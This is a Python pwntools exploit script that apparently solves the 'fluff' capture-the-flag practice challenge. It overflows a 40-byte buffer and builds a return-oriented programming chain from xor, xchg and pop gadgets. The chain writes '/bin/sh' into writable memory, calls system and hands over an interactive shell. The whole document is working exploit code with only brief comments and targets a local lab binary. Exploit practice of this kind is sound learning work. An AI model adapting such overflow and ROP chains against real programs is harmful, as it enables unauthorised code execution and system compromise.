from pwn import *

#0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
#0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
#0x00000000004008c3 : pop rdi ; ret
#0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
#0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
#0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret

r=process("./fluff")
STR_ADDR=0x006010b0
CALL_SYSTEM=0x004005e0
SET_RDI=0x004008c3
WRITE_MEM=0x0040084d
EMPTY_R11=0x00400822
XOR_R11_R12=0x0040082f
SET_R12=0x00400832
XCHG_R11_R10=0x00400840


def write_str(s,addr,exp):
    #write 8 byte string to memory using creative gadgets
    #plan:
    #empty r11
    #set r12 to write adress
    #xor r11 with r12 (r11 is zero so it should set it to r12)
    #xchg r11 with r10 (r10 now points to dest memory)
    #empty r11
    #set r11 to str with those same steps
    #write r11 to [r10]

    exp+=p64(EMPTY_R11)
    exp+=p64(0x41414141) # garbage r14 value
    exp+=p64(SET_R12)
    exp+=p64(addr)
    exp+=p64(XOR_R11_R12)
    exp+=p64(0x41414141) # garbage r12 value
    exp+=p64(XCHG_R11_R10)
    exp+=p64(0x41414141) # garbage r15 value
    exp+=p64(EMPTY_R11)
    exp+=p64(0x41414141) # garbage r14 val
    exp+=p64(SET_R12)
    exp+=s
    exp+=p64(XOR_R11_R12)
    exp+=p64(0x41414141)
    exp+=p64(WRITE_MEM)
    exp+=p64(0x41414141) # garbage rdi val
    exp+=p64(0x41414141) # garbage r13 val
    exp+=p64(0x0) # set r12 to 0 so the xor wont hurt our string
    return exp

exploit=b'A'*40
exploit=write_str(b"/bin/sh\x00",STR_ADDR,exploit)
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR)
exploit+=p64(CALL_SYSTEM)

r.sendline(exploit)
r.interactive()


